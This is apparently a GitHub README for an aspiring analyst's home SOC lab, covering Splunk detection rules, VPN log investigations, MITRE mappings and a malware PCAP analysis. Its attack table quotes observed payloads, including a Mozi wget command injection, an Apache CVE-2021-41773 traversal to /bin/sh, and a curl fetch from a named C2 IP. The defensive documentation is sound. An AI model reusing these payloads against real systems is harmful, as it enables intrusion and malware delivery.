# 🛡️ Home SOC Lab — Mohammed Faisal Jahangir

> A fully functional Security Operations Center (SOC) home lab built from scratch to simulate real-world enterprise security monitoring, threat detection, and incident response.

---

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    HOME SOC LAB                         │
│                                                         │
│  ┌─────────────────────┐    ┌─────────────────────┐    │
│  │  Windows Server 2022│    │    Windows 11        │    │
│  │  Domain Controller  │    │    Workstation       │    │
│  │  Active Directory   │    │    Sysmon installed  │    │
│  │  Splunk SIEM        │◄───│    Splunk Forwarder  │    │
│  │  Log Aggregation    │    │    Victim Machine    │    │
│  └─────────────────────┘    └─────────────────────┘    │
│            ▲                          ▲                 │
│            │                          │                 │
│            └──────────┬───────────────┘                 │
│                       │                                 │
│            ┌──────────▼──────────┐                      │
│            │    Kali Linux       │                      │
│            │    Attacker Machine │                      │
│            │    Wireshark        │                      │
│            │    Metasploit       │                      │
│            │    Nmap             │                      │
│            └─────────────────────┘                      │
└─────────────────────────────────────────────────────────┘
```

---

## 🛠️ Tools & Technologies

| Category | Tool | Purpose |
|---|---|---|
| SIEM | Splunk Enterprise | Log aggregation, SPL queries, alerting |
| Endpoint Logging | Sysmon | Deep Windows event telemetry |
| Log Forwarding | Splunk Universal Forwarder | Ship logs from endpoints to Splunk |
| Network Analysis | Wireshark | Packet capture and traffic analysis |
| Threat Intelligence | VirusTotal, AbuseIPDB, IPInfo | IOC verification |
| Attack Simulation | Kali Linux, Metasploit, Nmap | Simulating real attacks |
| Framework | MITRE ATT&CK | Mapping attack techniques |
| OS | Windows Server 2022, Windows 11, Kali Linux | Full enterprise simulation |

---

## 🔍 Investigations Completed

### 1. VPN Log Analysis — Account Compromise Detection
**File:** [investigations/VPN-Impossible-Travel-Penny.md](investigations/VPN-Impossible-Travel-Penny.md)

**Scenario:** Analyzed 2,862 VPN events from a fictional company CyberT to identify compromised accounts.

**Findings:**
- Detected impossible travel — same IP address (39.78.152.65) appearing in **England and China** simultaneously
- Identified account gap period (Jan 17-26) indicating active compromise
- Confirmed China connection was first-ever from that location

**SPL Query Used:**
```spl
index=main UserName=Penny
| stats count by Source_Country Source_ip
| sort -count
```

**Verdict:** Account compromised — attacker using proxy/VPN to mask real location

---

### 2. VPN Brute Force — Simon Account Takeover
**File:** [investigations/VPN-Brute-Force-Simon.md](investigations/VPN-Brute-Force-Simon.md)

**Scenario:** Identified anomalous spike of 1,981 events on January 11, 2022.

**Findings:**
- Simon generated **97% of all traffic** on Jan 11 (1,925 events)
- **1,918 failed login attempts** from IP 172.201.60.191 (Microsoft Azure/Netherlands)
- **7 successful logins** after brute force — account successfully compromised
- Attack confined to single day — targeted and deliberate

**SPL Query Used:**
```spl
index=main date_mday=11 date_month=january
| stats count by UserName action
| sort -count
```

**MITRE Mapping:** T1110 — Brute Force

**Verdict:** Successful account takeover via brute force attack

---

### 3. Malware PCAP Analysis — Multi-Stage Attack Investigation
**File:** [investigations/Malware-PCAP-Analysis.md](investigations/Malware-PCAP-Analysis.md)

**Scenario:** Analyzed one week of real server traffic (361,992 packets) from malware-traffic-analysis.net

**Attacks Found:**

| Attack | Evidence | Result |
|---|---|---|
| ICMP Ping Sweep | 13,511 ICMP packets from 203.161.44.208 | Reconnaissance confirmed |
| Mozi Botnet | GET /setup.cgi?todo=syscmd&cmd=wget Mozi.m | Failed — 404 response |
| Apache CVE-2021-41773 | POST /cgi-bin/.%2e/.%2e/.%2e/bin/sh | Failed — 404 response |
| Self-replicating malware | curl http://94.156.177.109/sh apache.selfrep | Failed |
| SSH Brute Force | 12,963 packets to port 22 | No successful auth |

**IOCs Identified:**
```
203.161.44.208  — Attacker IP (Namecheap/US) — 2/94 VT
94.156.177.109  — Malware C2 server (Netherlands) — 11/94 VT
Mozi.m          — IoT botnet malware
apache.selfrep  — Self-replicating shell script
CVE-2021-41773  — Apache path traversal
```

**Verdict:** All attacks failed — network survived. No successful compromise detected.

---

## 📊 SPL Detection Rules

### Brute Force Detection
```spl
index=main action=failed
| stats count as failed_attempts by UserName Source_ip
| where failed_attempts > 10
| eval risk = "BRUTE_FORCE_SUSPECTED"
| table UserName Source_ip failed_attempts risk
```

### Impossible Travel Detection
```spl
index=main
| stats dc(Source_Country) as countries_count by UserName
| where countries_count > 2
| sort -countries_count
```

### Suspicious Country Alert
```spl
index=main
| eval location_risk = case(
    Source_Country="China", "CRITICAL",
    Source_Country="North Korea", "CRITICAL",
    Source_Country="Iran", "CRITICAL",
    true(), "NORMAL")
| where location_risk="CRITICAL"
| table UserName Source_Country Source_ip EventTime location_risk
```

### High Volume User Detection
```spl
index=main
| stats count as total_connections by UserName
| eval risk = if(total_connections > 500, "SUSPICIOUS", "NORMAL")
| where risk="SUSPICIOUS"
| sort -total_connections
```

---

## 🗺️ MITRE ATT&CK Mappings

| Technique ID | Name | Evidence Found |
|---|---|---|
| T1595.001 | Active Scanning: IP Blocks | ICMP ping sweep — 13,511 packets |
| T1046 | Network Service Scanning | Port scan — 151,684 SYN packets |
| T1190 | Exploit Public Application | Apache CVE-2021-41773, Netgear exploit |
| T1105 | Ingress Tool Transfer | wget/curl downloading Mozi.m |
| T1110 | Brute Force | 1,918 failed SSH/VPN attempts |
| T1071.004 | DNS Tunneling | Suspicious DNS pattern analysis |
| T1210 | Exploitation of Remote Services | Island hopping attack pattern |
| T1078 | Valid Accounts | Account compromise via impossible travel |

---

## 📁 Repository Structure

```
Home-SOC-Lab/
│
├── README.md
│
├── investigations/
│   ├── VPN-Impossible-Travel-Penny.md
│   ├── VPN-Brute-Force-Simon.md
│   └── Malware-PCAP-Analysis.md
│
├── detection-rules/
│   ├── brute-force-detection.spl
│   ├── impossible-travel.spl
│   ├── suspicious-country.spl
│   └── high-volume-user.spl
│
├── incident-reports/
│   ├── IR-001-Simon-Brute-Force.md
│   └── IR-002-Penny-Impossible-Travel.md
│
├── mitre-mappings/
│   └── attack-technique-mapping.md
│
├── wireshark-analysis/
│   ├── malware-pcap-findings.md
│   └── IOC-masterlist.md
│
└── lab-setup/
    ├── network-diagram.png
    ├── sysmon-config.xml
    └── splunk-forwarder-setup.md
```

---

## 📋 Incident Reports

### IR-001 — Simon Account Brute Force
```
Date:      January 11, 2022
Severity:  CRITICAL
Status:    Contained

Attack:    Brute force via Microsoft Azure IP
Evidence:  1,918 failed + 7 successful logins
Action:    Force password reset, block IP,
           enable MFA, audit Jan 11 activity
```

### IR-002 — Penny Impossible Travel
```
Date:      January 20, 2022
Severity:  HIGH
Status:    Under Investigation

Attack:    Account compromise via proxy
Evidence:  Same IP in England + China
Action:    Force password reset, enable MFA,
           interview employee, block IP
```

---

## 🎯 Skills Demonstrated

```
Blue Team Skills:
✅ Network traffic analysis (Wireshark)
✅ SIEM log analysis (Splunk + SPL)
✅ Threat hunting methodology
✅ IOC identification and documentation
✅ Incident report writing
✅ MITRE ATT&CK framework mapping
✅ Threat intelligence (VirusTotal, AbuseIPDB)
✅ Detection rule creation
✅ Windows Event Log analysis
✅ VPN log forensics

Technical Skills:
✅ Splunk SPL queries
✅ Sysmon configuration
✅ Active Directory setup
✅ Network architecture design
✅ Linux command line (Kali)
✅ Packet analysis (TCP/UDP/DNS/TLS)
```

---

## 📚 Learning Path

This lab was built as part of a structured 90-day SOC analyst preparation program:

- ✅ Week 1 — Wireshark & Network Traffic Analysis
- ✅ Week 2 — Malware PCAP Analysis
- ✅ Week 3 — Splunk SIEM & SPL Queries
- 🔄 Week 4 — MITRE ATT&CK Framework
- 📅 Week 5 — Incident Response
- 📅 Week 6 — Web Application Penetration Testing
- 📅 Week 7 — Detection Engineering
- 📅 Week 8 — Python for SOC Automation

---

## 👤 About Me

**Mohammed Faisal Jahangir**
Aspiring SOC Analyst | Hyderabad, India

Actively building hands-on blue team skills through real attack simulation, log analysis, and threat hunting in a home lab environment.

📧 [Your Email]
💼 [Your LinkedIn URL]
🌍 Open to: SOC Analyst roles in Hyderabad, Remote, Gulf

---

> "The best way to learn defense is to understand offense."
